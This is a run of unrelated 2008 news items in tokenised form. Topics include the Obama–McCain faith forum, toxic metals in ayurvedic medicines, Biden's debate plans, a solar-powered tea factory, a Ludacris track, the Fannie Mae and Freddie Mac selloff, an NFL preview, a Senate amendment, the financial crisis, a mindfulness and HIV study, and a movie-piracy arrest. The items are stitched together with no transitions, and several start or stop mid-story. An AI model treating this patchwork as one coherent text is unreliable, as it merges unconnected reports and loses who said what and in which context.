Though the candidates came down on opposite sides of the California initiative that would ban gay marriage , both stressed that they opposed same - sex marriage .
Obama called marriage “ a sacred union , ” drawing applause when he added , “ God is in the mix . ”
Obama and McCain gave sharply divergent answers on which justices they would not have nominated to the Supreme Court .
Obama named Clarence Thomas , who he said was not a “ strong enough jurist or legal thinker , ” and Antonin Scalia , though he said he did n’t doubt “ his intellectual brilliance . ”

McCain ticked off the four liberal members : Ruth Bader Ginsberg , John Paul Stevens , David H. Souter and Stephen G. Breyer .
Aides to both candidates said the forum was a rare chance for them to talk about their faith and to use Warren ’s network to reach out to evangelicals .
The pastor ’s weekly services draw about 22,000 people .
The forum was broadcast live on three cable networks .
This year , both McCain and Obama have faced challenges with religious communities .
Conservative Christian leaders have urged McCain to spend more time talking about his opposition to abortion and his promise to appoint conservative judges .
Obama has continued to battle unfounded rumors that he is a Muslim .

Despite suspicion about McCain among Christian conservatives , a recent poll by CNN / Opinion Research Corp. found that 67 % of white evangelical voters favor McCain , while 24 % support Obama .
The forum also highlighted the stylistic differences between the candidates .
Obama ’s responses tended to be more freewheeling , while McCain frequently recited portions of his stump speech .
Obama offered a long answer to whether evil exists , stating that while “ we see evil all the time , ” individuals will not be able to “ erase evil from the world .
That is God ’s task . ”
But McCain seized the opportunity to mention Osama bin Laden and Islamic extremism , wielding his oft - repeated line about how he ’d pursue Bin Laden to the “ gates of hell . ”

The Arizona senator ’s focus was also evident in Warren ’s first question about which three people each candidate would rely on most during his administration .
McCain named Army Gen. David H. Petraeus , the top commander in Iraq ; John Lewis , the Democratic congressman and civil rights leader ; and his economic advisor , Meg Whitman , the ex-CEO of eBay .
That allowed him to remind the audience of three campaign themes : his foreign policy credentials , serving a cause greater than one ’s self - interest and his pledge to use the advice of people like Whitman to turn the economy around .
Obama named his wife and grandmother before moving to a bipartisan list of past and current senators .
When asked to cite a position on which they had changed their views in the last 10 years , Obama mentioned his initial concerns that welfare reform could have “ disastrous results . ”
McCain took the opportunity to tout his energy plan -- noting that he had abandoned his opposition to offshore oil drilling .
“ We ’ve got to drill now .
We ’ve got to drill here , ” he said .

Among the forum ’s lighter moments was Warren ’s challenge to “ define rich . ”
Obama poked fun at Warren , whose book “ The Purpose - Driven Life ” was a bestseller .
“ Well , if you ’ve got book sales of 25 million , you qualify , ” Obama joked before saying : “ I would argue that if you ’re making more than $ 250,000 , you ’re in the top 3 % or 4 % of the country , and you ’re doing well . ”
McCain , whose wife ’s wealth has been estimated at more than $ 100 million , tried to dodge the question .
But with a chuckle , he finally gave a figure : “ I think if you ’re just talking about income , how about $ 5 million ? ”

Times staff writer Kate Linthicum contributed to this report .
Ayurveda , a healing tradition from India , is as old as the hills .
And apparently ayurvedic medicine available through the Internet contains as many toxic metals as the hills , according to a study published in the Journal of the American Medical Association .
A team from Boston University found that more than 20 percent of nearly 200 samples of various ayurvedic cures contained dangerous amounts of lead , arsenic and mercury .
Sometimes the presence of metals was a result of sloppy manufacturing ; other times the metals were added deliberately as part of the cure .
The authors — who are advocates of alternative medicine and include an ayurvedic practitioner as well as a lead poisoning expert from India — said they hope their report can help separate wheat from chaff , that is , the useful elements from the ayurvedic tradition from the real whacky stuff .
Problems with ayurveda
India is proud of its ayurvedic tradition , which dates back over 7,000 years and likely predates Traditional Chinese Medicine .
By 1000 BCE , when Europeans were still living in mud and beating each other with clubs , Indian doctors used the principles of ayurveda to drain fluids , sew wounds , remove kidney stones and even perform cosmetic surgery .
For the most part , the ayurvedic tradition — which incorporates yoga , meditation and diet — makes for a healthy lifestyle .
But the safety and efficacy of some ayurvedic cures are questionable , because often they incorporate chants and are based on astrology , personality traits , pulse readings , a supposed imbalance of three bodily humors ( called vata , pitta and kapha , like China 's yin and yang ) and other discredited beliefs .
Your herbal cure for , say , a bad cough might be different from the next person's as a result of your birthday and Mars being aligned with Jupiter .
Among these odd elements of ayurveda , the JAMA report targets a practice called rasa shastra , which uses mercury and other metals as curatives .
Nearly half of the rasa shastra remedies tested had dangers levels of metals ; several were 10,000 times over the U.S. safety limit .
Regardless whether you are a Leo or a Capricorn , that 's not healthy .
So the authors called into question the entire practice of rasa shastra .
India strikes back
Some folks in India did n't take the JAMA report lightly .
The Indian Ministry of Health and Family Welfare issued a press release last week that stated :
" It needs to be emphasized that as per the directions issued by Department of AYUSH , herbo- metallic compounds are not being officially exported because of heavy metal concerns and only purely herbal Ayurveda , Unani and Siddha medicines are being exported from India with effect from 1st January 2006 after certification of heavy metals below the permissible limit by the manufacturing unit . "
Read between the line , and this implies ( a ) herbo- metallic compounds still exist in India as part of the ayurvedic tradition ; ( b ) herbo-metallic compounds are being unofficially exported ; and ( c ) and herbo-metallic compounds used to be exported until European and American researchers exposed the practice .
The lead author on JAMA report , Robert Saper , was in fact one of the pesky researchers in 2004 who revealed the fact that more than 20 percent of imported ayurvedic cures in Boston 's South Asian grocery stories had illegal levels of toxic metals .
Know your source
Ayurveda has gained popularity in the United States with promoters such as Deepak Chopra , who charges thousands of dollars for seminars about how ayurveda can improve your golf game .
The tradition has become somewhat elitist in the United States , with ayurvedic spas , soaps , candles and other luxury items .
Many likely do n't know nor want to know about the idiosyncrasies of ayurveda .
( We have n't addressed the use of cow urine and dung . )
Ayurveda , after all , has much going for it .
But when experimenting with traditional medicines , particularly when you are outside of that culture , it 's prudent to understand what you are getting into .
The Boston University team is one group of alternative medicine advocates who want to legitimize useful ancient therapies not because they are ancient but because they work .

Joe Biden hugs a supporter at a rally in front of the Detroit Public Library on Sunday .
Biden 's strategy : Go easy on Palin
If Sarah Palin goofs , flounders , stumbles or blunders during her debate against Joe Biden on Thursday night , Biden is going to let it slide .
“ If she makes a gaffe , he underplays it , ” one of the people prepping Biden for his vice presidential debate told me .
“ At most , he says , ‘ I am not sure what Gov. Palin meant there . ’ ”
Advertisement
There are three reasons for this .
First , Biden does not want to look condescending .
For the same reason , he plans on referring to Palin as “ Gov. Palin ” during the debate and never as “ Sarah . ”
( He will sometimes refer to John McCain as “ John , ” however , because they have been senators together for many years . )
Second , Biden knows the press is going to pounce on any mistakes , and so he does not need to .
Third , and most important , Sarah Palin is not Biden ’s true target .
“ Joe Biden ’s No. 1 job during the vice presidential debate is to keep the focus on the top of the ticket , ” the Biden debate prepper told me .
“ He is going to keep the focus on John McCain . ”
This is an arguable strategy .
After all , McCain is the experienced one on the Republican ticket , the one whose credentials to be commander in chief from Day One are not in much question .
So why attack him instead of Palin , whose lack of readiness has been the subject of endless discussion as well as late - night comedy ?
Because , at least in the past , Americans have not concentrated on the bottom of the ticket when it comes time to vote .
They care about who the president is going to be , not who the vice president is going to be .
Dan Quayle had a disastrous debate against Lloyd Bentsen in 1988 .
Even before Quayle stumbled into the trap of comparing himself to John F. Kennedy , Quayle had enormous difficulty answering this basic question from Brit Hume : “ Let us assume … the president is incapacitated for one reason or another , and you have to take the reins of power .
When that moment came , what would be the first steps that you ’d take and why ? ”
( Gratuitous advice to Biden and Palin : Have an answer ready for this one , just in case . )
Quayle had no answer , looked shellshocked and mumbled something about how he would “ say a prayer for myself and for the country . ”
( He would n’t have been the only one . )
After the debate , Susan Estrich , Michael Dukakis ’ campaign manager , came into the press filing center wearing a blue button that said “ President Quayle ? ”
Other Democrats wore more grisly red buttons that showed an EKG graph with the words “ Quayle — A Heartbeat Away . ”
Quayle was considered a joke after that debate .
But he got to the White House .
Americans decided that the top of the ticket — George H.W. Bush — was a lot more important than the bottom of the ticket .
But wait .
Things are different now , are n’t they ?
We are engaged in shooting wars in Iraq and Afghanistan , our economy is teetering on the verge of collapse , and the top of the Republican ticket is 72 years old and a cancer survivor .
So wo n’t Americans care more this time about whether Sarah Palin is really qualified to be president should she need to be ?
Wo n’t they care more this time about who the running mate is ?
Probably not , says the Obama campaign .
“ Who a candidate chose as his running mate may be one factor in how a voter feels about the presidential candidate , ” a top aide to Barack Obama told me .
“ But at the end of the day , voters go into the booth and vote for who they want as president . ”
Biden is prepping hard .
While he does not expect to make much of any gaffes Palin might commit , he is preparing his own lines of attack on her record .
But at the end of the debate , he will not judge his success on whether the audience believes Biden is a better choice than Palin .
He wants the audience to believe Obama is a better choice than McCain .
Traditional Medicinals Completes World 's Largest Solar - Powered Tea Factory
September 30th , 2008 by Ariel Schwartz
I ’m a huge fan of Traditional Medicinals tea , so I ’m pleased to learn that the company has just completed the largest solar powered tea factory on the planet .
Traditional Medicinals ’ 70,000 square foot Sebastopol , CA headquarters will use 1450 solar panels that generate 430,000 KWh of power — that ’s 75 percent of the company ’s total energy needs .
The rest of the factory ’s energy use will be offset by wind energy credits .
Today ’s announcement is n’t Traditional Medicinals ’ first foray into the alternative energy world — the company has offset 100 percent of its energy needs with wind power credits for years .
Additionally , the company headquarters contains a self - sustaining water source and purification system , a large fish pond for fire suppression , and a border of drought - resistant landscaping .
Akeena Solar , a California - based designer and installer of solar panels , assisted Traditional Medicinals with construction of its solar power system .

( Newser ) – Ludacris may have lost his most famous fan .
Yesterday the rapper released “ Politics as Usual , ” a track from his upcoming CD that sings Barack Obama ’s praises .
But an Obama spokesman says Luda should be “ ashamed ” of the tune , which , among its other meditations , calls Hillary Clinton an “ irrelevant bitch ” and says John McCain “ should n’t be in any chair unless he ’s paralyzed . ”
story continues below
Many rappers are preparing Obama - themed tracks , but Ludacris has actually met Obama .
In the song , he calls himself one Obama ’s “ favorite rappers ” — perhaps because the senator said in a Rolling Stone interview in June that he listens to Ludacris on his iPod — and asks for “ a special pardon if I ’m ever in the slammer . ”
An Obama spokesman said that , while Luda is a “ talented individual , ” the song is “ outrageously offensive . ” ( Read more Ludacris stories . )
NEW YORK ( Reuters ) - Investors dumped shares of Fannie Mae FNM.N and Freddie Mac FRE.N on Monday after a newspaper report said government officials may have no choice but to effectively nationalize the U.S. housing finance titans .
The corporate logo for Freddie Mac is seen at its headquarters building in McLean , Virginia in this July 23 , 2008 file photo .
REUTERS / Larry Downing
A government move to recapitalize the two companies by injecting funds could wipe out existing holders of the largest U.S. home funding companies ’ common stock , the weekend Barron ’s story said .
Preferred shareholders and even holders of the two government - sponsored entities ’ $ 19 billion of subordinated debt would also suffer losses .
Shares of Fannie Mae sank more than 22 percent to a 19 - year low on Monday , closing at $ 6.15 , while Freddie ’s shares plunged 25 percent to $ 4.39 .
Some of their bonds sharply underperformed Treasuries .
A $ 4 billion sale of new Freddie Mac debt drew weak bids compared with similar issues last week .
A spokeswoman for the U.S. Treasury said the department has no plans to use its authority to backstop the two funding agencies .
That authority was greatly increased by a rescue plan approved at the end of July .
“ The Barron ’s article overstated Freddie Mac ’s financial situation , ” Sharon McHale , a Freddie Mac spokeswoman , told Reuters .
“ We continue to be adequately capitalized . ”
Fannie Mae spokeswoman Janis Smith declined to comment .
The poor performance of the U.S. mortgage market has pulled home loan rates up by about a percentage point from a year ago , just as the worst housing market since the Great Depression struggles to find a bottom .
“ Investors have been trying to put the housing and credit crisis behind them .
They want to believe we ’re in the eighth or ninth inning , but every time news like this comes up , they have to readjust their thinking , ” said Paul Nolte , director of investments at Hinsdale Associates in Hinsdale , Illinois .
Overseas central banks have sold nearly $ 11 billion from their holdings of agency - related securities in the past four weeks , awaiting clarity on the extent and nature of U.S. government backing of the two faltering companies , which are chartered by Congress to support housing by keeping money flowing in the mortgage market .
The two companies , known as GSEs , together own or guarantee more than $ 5 trillion in U.S. mortgages .
“ There is a lot of uncertainty with what happens in terms of capital raising and a lot of investors are in a wait - and - see mode , ” said Rajiv Setia , analyst at Barclays Capital .
“ From a GSE perspective , as long as they get funding it does not matter at what price as they will just pass it on with higher mortgage rates . ”
The value of some of the two companies ’ debt that is at the biggest risk of loss in the event of a government rescue fell to a record low in comparison with similar Treasury securities .
Spreads on some Freddie Mac 10 - year subordinated debt widened over Treasury notes to a bid of 400 basis points and offer of 360 basis points , from a close of 285 basis points on Friday , according to one investor , citing a dealer ’s data .
An insider in the Bush administration told Barron ’s that Fannie and Freddie “ are being jawboned ” by the Treasury Department and their new regulator , the Federal Housing Finance Agency , to raise more equity .
But government officials do not expect the agencies to succeed , Barron ’s reported .
If the GSEs fail to raise fresh capital , the administration is likely to mount its own recapitalization , with the Treasury infusing taxpayer money into the agencies , according to the Barron ’s source .
A government infusion would take the form of a preferred stock with such seniority , dividend preferences and convertibility rights that Fannie ’s and Freddie ’s existing common shares “ effectively would be wiped out , and their preferred shares left bereft of dividends , ” according to the Barron ’s report ,
The report said an equity injection by the government would be a quasi-nationalization -- without having to put the agencies ’ liabilities on the U.S. balance sheet , and thus doubling U.S. debt .
Merrill Lynch also weighed in on Freddie Mac on Monday , saying the company will likely raise fresh capital in the third quarter , comprised of at least 50 percent common stock .
Merrill also cut its price target on the company .
Freddie Mac early on Monday said it will sell $ 3 billion of five - year notes on Tuesday in a sale that is sure to draw heightened scrutiny to gauge investor interest .
“ Lukewarm was my overall characterization , ” Nancy Vanden Houten , analyst at Stone & McCarthy Research Associates , said in an e-mail on Freddie Mac ’s $ 4 billion debt sale .
“ The bid - to - cover ratios were weak for all three bill auctions .
Spreads were n’t uniformly bad , however .
“ The Barron ’s story seems to be getting a lot of attention , rightly or wrongly , ” Vanden Houten added .
A bid - to - cover ratio reflects the amount of total bids compared with the amount offered .
A lower ratio indicates weaker demand .
“ The pricing was in line with where swaps and in accordance with the market , Freddie Mac ’s McHale said .
Several U.S. insurance companies have “ substantial ” exposure to securities issued by Fannie Mae and Freddie Mac but should avoid big write - downs because of the federal government ’s backing of much of those securities , A.M. Best Co said on Monday .
The U.S. insurance industry invested $ 371 billion in securities issued by the mortgage financiers at year end , but $ 366.4 billion of the sum was in fixed income , A.M. Best said .
“ Much of the industry ’s exposure represents fixed - income securities , which should benefit from the added financial backing of the federal government , ” A.M. Best said .
Tom Brady did n't take a snap in a preseason game .
Neither did Peyton Manning .
Brady 's New England Patriots staggered to an 0 - 4 record while Manning 's Indianapolis Colts came home 1 - 4 .
Might as well write those two off .
No way the last two AFC champions recover from that string of defeats , right ?
Ah , well , the preseason is the preseason .
Past is prologue .
Go ahead .
Ignore the Pats and Colts when the games truly count .
You 'll be sorry .
Not that it is n't fair to ask some questions as the 2008 season gets fully into its schedule on Sunday .
There 's a lot to wonder about as the 32 teams begin the chase for Super Bowl XLIII .
So what 's the story with Brady and Manning ?
Are they OK ?
Their teams do n't look like it .
Remember that the Colts had n't had much success in the preseason .
Their record over the last four years : 3 -15 .
Manning , who had surgery to remove an infected bursa sac from his knee , began practicing a week ago .
He expects to play in the Sunday night opener at home against the Chicago Bears — their Super Bowl opponents two years ago who since fallen on hard times .
" That 's certainly my plan , " he says .
" I 'd say we 're on point for that . "
The enforced idleness and rehab after surgery were n't easy for Manning , who has started 160 consecutive regular - season games — every single one in his 10 - year career .
" I 'd have hated to be his nurse , " jokes his father , Archie .
RISKY BUSINESS : Teams guessing with uncertain QB situations
THE BELL TOLLS : Whither Merriman on balky knee ?
WEEK 1 PICKS : Our panelists project the winners
The Patriots took no chances with Brady as he nursed a foot injury .
They went with their backup quarterbacks and struggled offensively .
Brady is expected to start Sunday when they host the Kansas City Chiefs .
He set a single - season NFL record last year by throwing 50 touchdown passes and he took part in all of the spring workouts .
So how rusty can he be ?
" Well , there is nothing like playing , " he says .
" You can't replicate the speed of that , the decision - making that goes into it or your level of energy .
I think the fortunate thing for me is that I have played in about 130 games .
So I know that speed and my body knows that speed .
Hopefully I can rely on that past history that I have had playing . "
About the Patriots :
Any chance they go unbeaten in the regular season again ?
The Patriots have won 19 consecutive regular - season games and 23 of 24 dating to mid-November of 2006 .
Their 2008 schedule , based on their opponents ' wins and losses last year , is the NFL 's easiest .
Their first three games are against the Chiefs , New York Jets and Miami Dolphins , who were a combined 9 - 39 .
They play only four teams that made the playoffs .
Coach Bill Belichick made a point of never addressing the winning streak last season and still refuses to take the bait .
" What we need to do , " he says , " is focus on today .
That 's what we can control and do something about . "
Obstacles to perfection : A road meeting with the San Diego Chargers on Oct. 12 , which will be the second consecutive West Coast game for the Patriots .
The Patriots beat the Chargers in the AFC championship game last January , in Week 2 and in the previous season 's playoffs .
They 'll also play the Colts on the road Nov. 2 .
More important : Fast start or strong finish ?
The New York Giants started 0 - 2 in 2007 and won the Super Bowl .
The New Orleans Saints began 0 - 4 and never recovered .
The Washington Redskins were 5 - 7 and then won their last four games to earn a wild - card playoff berth .
Getting hot at the right time seems to be the motif of some recent Super Bowl winners .
The Giants , for example , strung together three road playoff victories and then knocked off the Patriots for the NFL title .
Three years ago , the Pittsburgh Steelers won seven of their first nine , then lost three in a row to seemingly jeopardize their playoff spot .
Then they won their last four , added three road playoff victories and beat the Seattle Seahawks in Super Bowl XL .
The Philadelphia Eagles have been to four conference championship games and a Super Bowl in Andy Reid 's nine seasons as coach but they 're 3 - 6 on opening day .
It 's no understatement to say they want to try a quick start for a change .
Finishing with three consecutive wins last year did not salvage a 1 - 3 start and the 8 - 8 Eagles were the only NFC East team to miss the playoffs .
" To get wins in this league is tough , " quarterback Donovan McNabb says .
" To set the tone at the very beginning of the season will do a lot for you as the season continues . "
If there 's a best of all possible worlds , then , it includes a fast start and a strong finish .
Failure from the get - go can't always be overcome when expectations are high .
Such is the weight of expectations .
What , exactly , is the weight of expectations ?
Let 's go back to the Patriots for a second .
They came within 35 seconds of a 19 - 0 record and their fourth Super Bowl victory in seven years .
Instead , thanks to their shocking 17 - 14 loss to the New York Giants , they 'll be remembered as the most glorified runner - up in NFL history .
Given the soft schedule , they 're widely predicted to make it back to the Super Bowl .
A burden ?
Maybe not .
" The bar has been raised so high that it 's actually a little bit easier to focus because we know what we have to do , " says Randy Moss , whose 23 touchdown receptions last season set an NFL record .
Let 's look at the Saints .
They followed their near - miss of their first Super Bowl with a 7 - 9 slip back into mediocrity .
" Are we the team of 2006 that made it to the NFC championship game or are we the team of last year ?
Well , we think we 're the team of 2006 but we have to go out there and prove it , " says Saints general manager Mickey Loomis .
Maybe that 's why there 's such a turnover among playoff teams each year .
The 2007 field of 12 featured six teams that were n't there in '06 .
Only four of the '05 playoff teams repeated the following season .
" It 's harder to win when everyone expects you to win , " Brees says .
" You can look at a couple of Super Bowls the past few years where a two - touchdown underdog won .
How is that possible ? …
It 's harder to go out and win when everybody expects you to win than it is to win when everybody thinks you 're terrible . "
Where might some coaching jobs be open after the season ?
There seems to be a disconnect in Oakland between second - year coach Lane Kiffin and owner Al Davis over personnel ( players and coaches ) .
Kiffin has a quarterback , JaMarcus Russell , who has made one start , and a couple of receivers ( Javon Walker , Ashley Lelie ) of questionable durability and productivity .
Across the bay , the San Francisco 49ers have had four consecutive losing seasons , three under Mike Nolan .
" Mike 's very aware of what this season means for him and I think he feels pretty good about the group around him , " says Brian Billick , the former Baltimore Ravens coach now working for Fox .
Nolan served on his Ravens staff from 2001 - 2004 .
Others who may want to insulate their backsides against heat damage : Rod Marinelli , 10 - 22 in two seasons with the Detroit Lions ; Brad Childress , 14 - 18 in two seasons with the Minnesota Vikings ; Scott Linehan , 11 - 21 in three seasons with the St. Louis Rams .
Perhaps no coach is under a biggest microscope than Wade Phillips in Dallas .
If the Cowboys , 13 - 3 last year , do n't advance in the playoffs , Phillips could be in jeopardy .
The Cowboys have n't won a playoff game in 12 years and Phillips has n't either as coach of the Cowboys , Denver Broncos and Buffalo Bills ( 0 - 4 ) .
" I think Dallas is the most talented team in the NFC and as talented as any team in the NFL .
It 's one thing to say you 're a talented team but it 's another thing to say you are a good team , " says Troy Aikman , the former Cowboys quarterback .
" They have to be able to pull this collection of talent together to play well when it matters most .
That is something they struggled with last year . "
Jesse Helms
SA 5074 .
Mrs. DOLE submitted an amendment intended to be proposed by her to the bill S. 2731 , to authorize appropriations for fiscal years 2009 through 2013 to provide assistance to foreign countries to combat HIV / AIDS , tuberculosis , malaria , and for other purposes ; which was ordered to lie on the table ; as follows :
On page 1 , line 5 , strike " and Henry J. Hyde " and insert " , Henry J. Hyde , and Jesse Helms " .
1 . It all began with cheap money .
To prop up ailing economies early in this decade , central banks in the U.S. and Japan kept interest rates unusually low , which encouraged speculation .
In the U.S. , the Federal Reserve lowered the federal funds rate -- the rate that banks charge each other for overnight loans and a barometer for the cost of borrowing money on a short - term basis -- from 6.5 % in 2000 to 1 % by mid 2003 .
Cheap money quickly ignited a sharp rise in home values in virtually every corner of the country .
Advertisement - Article continues below 2 . Financial magicians made subprime loans golden .
Banks and mortgage companies fed speculation in home prices by offering cheap credit to all comers , including those who would not normally qualify .
What to do with these subprime loans ?
Package them with thousands of high - grade loans to sell to investors .
To make the subprime loans attractive , underwriters bought insurance policies guaranteeing that the loans would be repaid .
With insurance on the loans , credit - rating agencies stamped such paper as triple - A - rated debt .
3 . The global economy became infected with poisoned debt .
The loans came to investors as collateralized - debt obligations , or CDOs .
A CDO is a huge package of loans sold in assorted segments -- known as tranches -- with varying interest rates and levels of risk .
Buried inside the least - risky tranches were those subprime mortgages masquerading as triple - A - rated debt because of their insurance policies .
Companies that wrote the insurance policies on these mortgages assumed that default levels would be minuscule .

4 . So much for those assumptions .
Home prices tipped downward , setting off a chain reaction .
All bubbles eventually burst .
The Fed began raising short - term interest rates in 2003 , eventually boosting the federal funds rate to 5.25 % by the summer of 2006 .
As a result , adjustable - rate mortgages ( particularly the subprime variety ) began to reset at far higher interest rates , and in July 2006 the rise in home prices abruptly stopped .
In fact , home values began a descent that continues to this day , in many communities averaging a loss of 15 % to 30 % .
As borrowers realized their homes were worth less than the amount they owed on their mortgages , the default rate shot up .
5 . Rating agencies lowered their assessment of those supposedly triple - A subprime loans to junk levels .
The investment and commercial banks , pension funds , and other institutions that had bought the supposedly safe , triple - A- rated CDO tranches woke up to find their investments tainted by those poisonous subprime loans , which began to default at alarming rates .
Holders of these CDOs found it all but impossible to know what they were really worth .
And when they tried to sell them , there were few buyers -- the beginning of a seize - up of U.S. debt markets .
Advertisement - Article continues below 6 .
A wave of write - downs on the value of those loan packages commenced .
Financial accounting standards require banks and investment companies to " mark to market " the value of their assets each day .
If it 's impossible to value a security because there is no market for it , too bad -- make a smart guess .
Starting in 2007 , one financial institution after another announced a series of quarterly write - downs of hard - to - value and unsalable CDOs that turned into a financial tidal wave .

7. Financial institutions were revealed as vastly undercapitalized .
As the quality of their debt portfolios deteriorated , investment banks wrote off billions of dollars of bad assets each quarter , causing their reserves to shrivel .
Commercial banks are leveraged with perhaps ten times as much in assets as capital .
But some investment banks leveraged themselves more than 30 to 1 , to the point that should anything go seriously wrong with those assets , their businesses could fail .
The same held true of Fannie Mae and Freddie Mac , which own or guarantee more than $ 5 trillion in mortgage debt .
Advertisement - Article continues below 8 . A cloud of suspicion and distrust enveloped financial markets .
Surprised by these developments , investors large and small realized that stocks of supposedly stable financial institutions were in fact ticking time bombs and began selling their shares .
Banks , which routinely lend each other money overnight , curtailed those loans because they began to lose faith in the value of the collateral the borrowing banks were offering .
9 . The gathering storm set off a sickening wave of failures .
One of the first banks to fail was California 's IndyMac , which was a leader in subprime lending .
Countrywide , the biggest mortgage lender , sold itself to Bank of America to avoid insolvency .
This spring , Bear Stearns , the most overextended of the investment banks , failed , and the government arranged a forced marriage with JPMorgan Chase .
Then in September , to avert a collapse of Fannie Mae and Freddie Mac , the government seized control of them by putting them in a conservatorship that made Uncle Sam the explicit guarantor of mortgages they owned or insured .

10 . Lending of all sorts started to freeze up .
First to coagulate , last winter , was the market for auction - rate securities .
These are long - term debt securities whose interest rates are regularly reset , so that they behave more like short - term notes .
With no buyers , investors in these notes were stuck .
By September , even overnight loans among banks had dried up .
And despite hundreds of billions of dollars in cash that central banks around the world pumped into banks ' coffers , few banks put that money to work for fear it would be needed to shore up their own finances .
Recently , investors began withdrawing tens of billions of dollars from supposedly supersafe money - market funds , which invest in , among other things , short - term corporate debt .
11 . And government could not steady the boat .
Nothing that Washington tried -- lowering interest rates , flooding the economy with gazillions of dollars to keep the financial community afloat , rescuing Fannie Mae and Freddie Mac -- instilled confidence in financial institutions .
When Lehman Brothers Holdings declared bankruptcy on September 15 , fellow investment bank Merrill Lynch sold itself to Bank of America to avoid being next to topple .
That was followed by the government 's rushed takeover of American International Group , the world 's largest insurer , whose forays into insuring the repayment of billions of dollars in debt had drained its capital .

Word of a rescue plan to take bad assets off the hands of financial companies is encouraging investors .
The Bush administration 's proposal , being crafted with congressional leaders , would create a federal agency to take hundreds of billions of dollars in " bad assets " off the balance sheets of financial institutions , for a price .
Eventually , those assets that recover their value would be sold back into public markets .
Conceivably , the ultimate cost to the government of this plan may not be that great .
Word of this plan fueled huge rallies in the U.S. stock market on September 18 and 19 .

Throughout 2008 , the year - over - year decline in home sales has been slowing , indicating that activity in the housing market could soon pick up .
Meanwhile , the inventory of unsold homes has almost quit growing , and the months ' supply of unsold homes is one - third of what it was at the start of the year .
This matters , because only when prices stabilize will the wave of foreclosures crest and the extent of bad debt poisoning the balance sheets of financial institutions be known .

But the economy will suffer aftershocks for years .
That 's because banks have already lost $ 1 trillion to bad debt during this crisis , and some experts expect the losses to end up being twice that amount .
Less capital means less money to lend and far stricter limits on credit to borrowers .
Years could pass before banks can rebuild their capital to the levels that existed before this crisis .
The shocks already felt could cause the economy to fall into recession ; it 's too soon to tell .
15 . Do n't lose hope .
A financial panic causes people to lose their ability to reason .
But just because a panic can end in utter economic disaster does n't mean that it will .
Just as banker J. Pierpont Morgan could quell the Panic of 1907 by walking onto the floor of the New York Stock Exchange and buying bank stocks , so too could decisive government action contain the Panic of 2008 .
You may not know the outcome of this drama for weeks or months to come .

Researchers at UCLA recently announced the results of a study of mindfulness medication among people with HIV .
This is n’t the first team to look at the use of stress - reducing psychological and spiritual practices among people with HIV / AIDs .
But it is the first team to look at the right outcome measure .
Studies of the impact of alternative and complementary therapies in immune - mediated diseases ( chronic inflammatory processes , cancer , and HIV / AIDS ) typically use mortality as the outcome of interest .
You can make a good argument that this is fitting : avoiding death is , of course , the most ultimately meaningful outcome .
However , using mortality as the outcome in studies of chronic , debilitating diseases is like saying that the best way to gauge the effectiveness of changing the oil in your car every 2,500 miles is whether or not it stops running in the next year or two .
I do n’t mean to trivialize the practice of mindfulness or being HIV - positive or having any other disease with this automotive analogy .
I ’m just trying to make a point about how loose the association often is between intervention and outcome in mortality studies — even though most try , with varying degrees of success , to control for some other factors that can influence mortality : age , comorbid conditions , stress levels , the use of antiretroviral therapy .
But , until now , no study has focused solely on clinically meaningful intermediate outcomes .
The UCLA researchers measured the impact of mindfulness - based stress reduction ( MBSR ) on CD4 T lymphocyte levels .
These cells are the ones that the human immunodeficiency virus slowly eradicates .
The researchers took a small population of ethnically diverse and stressed HIV - positive people and , by random selection , separated them into two groups .
The control group went to a one day seminar on MBSR .
The other group augmented the one - day session with weekly two - hour training sessions and daily home practice .
People who participated in the eight - week program showed no decline in CD4 T cells .
In contrast , T cell levels in members of the control group continued to decline over the course of the study .
The researchers controlled for key factors , such as whether the participants were also taking antiretroviral medications .
Other than the small population size ( 48 ) , the study design sidesteps the criticisms that are often leveled at CAM ( complementary and alternative medicine ) related research : no random selection , no control group .
In fact , the use of one day of MBSR as the control criterion ( as opposed to no MBSR at all ) is brilliant , because the study suggests a dose - response effect .
As the lead author , David Creswell , noted in a UCLA press release ,
The more mindfulness meditation classes people attended , the higher the CD4 T cells at the study ’s conclusion .

Many of them have received donations from a handful of relatively new organizations , including Veritas , which was created in 2006 , and the Jack Miller Center for Teaching America ’s Founding Principles and History .
Mr. Miller , a Chicago entrepreneur , established the center as an independent nonprofit last fall after first collaborating with the 55 - year - old Intercollegiate Studies Institute , which promotes conservative thought on campus .
Now , thanks in part to years of intensive lobbying by the National Association for Scholars , these projects may soon receive federal money as well .
The new Higher Education
Act , signed into law last month , provides grants for “ academic programs or centers ” devoted to “ traditional American history , free institutions or Western civilization . ”
The provision was “ fashioned with this movement in mind , ” Stephen Balch , a Republican and the founder and president of the association , said after the bill passed Congress , and “ will help it gain even greater momentum . ”
It is up to Congress to decide whether to finance the effort , and how much to put toward it .
Mr. Piereson previously served for 20 years as the executive director of the John M. Olin Foundation , one of the largest financiers of the intellectual right before it closed .
“ I would have to say in all that time , from 1985 and 2005 , when we wound down , I ’m not sure we made a lot of progress ” on the undergraduate level , he said .

Decades of money from Olin and similar foundations helped create a kind of shadow university of private research institutes on the assumption that conservatives could not find a berth in an academic system dominated by liberals .
They have been so successful , though , that they might have helped siphon like - minded thinkers off campus , creating a kind of right - wing brain drain .
Now , Mr. Piereson said , “ what we ’re trying to do is actually go onto the campus and fund professors who have the support of their deans , provosts and colleagues and try to influence the undergraduate curriculum . ”
A man allegedly seen ' camming ' the latest Batman movie has been arrested by police .
Following guidelines , theater employees called the police after suspicions were aroused .
According to the MPAA , many other movies have been recorded at this theater .
It was always going to be a big , big movie and it certainly did n’t disappoint , going to set a one - day box office record of $ 66.4 million on opening day , according to Warner ’s head of distribution , Dan Fellman .
No one , not even pirates are allowed to ruin this party .
Hindering piracy of the movie was always high on the list for Warner and it handed out night vision goggles in Australia in an attempt to thwart ‘ cammers ’ – people who record movies in theaters .
In Australia ‘ cammers ’ are asked to leave if they are caught by theater staff , in the United States things are a little different .
According to reports , on Friday morning Eastglen 16 Theater employees grew suspicious that a man was recording , or ‘ camming ’ the “ Dark Knight ” movie .
Following movie industry guidelines they called police at around 9:40 pm , who arrived shortly after .
Lee ’s Summit police confirmed that they found evidence that the 40 - year - old man from Grandview , Mo. had recorded the movie so they arrested him .
A few hours later the police went to the man ’s house and conducted a search where they say they found pirate movies on DVD .
According to the MPAA , several other movies have been recorded at the Eastglen 16 theater , but at this stage it is not known if the man is affiliated with any particular group or was acting alone .
Police have not released the name of the suspect .
Inevitably , and despite the best efforts of Warner , Rlslog reports that a copy of the movie has been leaked onto the Internet by a release group called “ TradingStandards ” who apparently ‘ stole ’ it from a P2P group called ‘ DEViSE ’ who actually ‘ stole ’ it from 2 B ros – quite confusing .
